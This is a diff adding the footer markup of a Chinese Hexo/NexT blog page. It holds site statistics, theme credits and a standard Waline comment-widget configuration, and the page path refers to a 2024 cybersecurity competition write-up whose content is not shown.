+    <a href="/atom.xml" target="_blank">RSS</a>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">158k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">9:36</span>
+  </span>
+</div>
+<div class="busuanzi-count">
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动 
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+<script class="next-config" data-name="waline" type="application/json">{"lang":"zh-cn","enable":true,"serverURL":"waline-server-ten-phi.vercel.app","cssUrl":"https://unpkg.com/@waline/client@v2/dist/waline.css","commentCount":false,"pageview":false,"avatar":"mm","meta":["nick","mail","link"],"pageSize":10,"requiredMeta":["nick","mail"],"libUrl":"//unpkg.com/@waline/client@v2/dist/waline.js","el":"#waline","comment":true,"path":"/2024/11/16/2024%E5%B1%B1%E4%B8%9C%E7%9C%81%E4%BF%A1%E5%88%9B%E5%A4%A7%E8%B5%9B-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%86%B3%E8%B5%9B-WriteUp/"}</script>
+<link rel="stylesheet" href="https://unpkg.com/@waline/client@v2/dist/waline.css">
+<script>
+document.addEventListener('page:loaded', () => {
+  NexT.utils.loadComments(CONFIG.waline.el).then(() =>
+    NexT.utils.getScript(CONFIG.waline.libUrl, { condition: window.Waline })
+  ).then(() => 
+    Waline.init(Object.assign({}, CONFIG.waline,{ el: document.querySelector(CONFIG.waline.el) }))
+  );
+});
+</script>
+
+</body>
+</html>
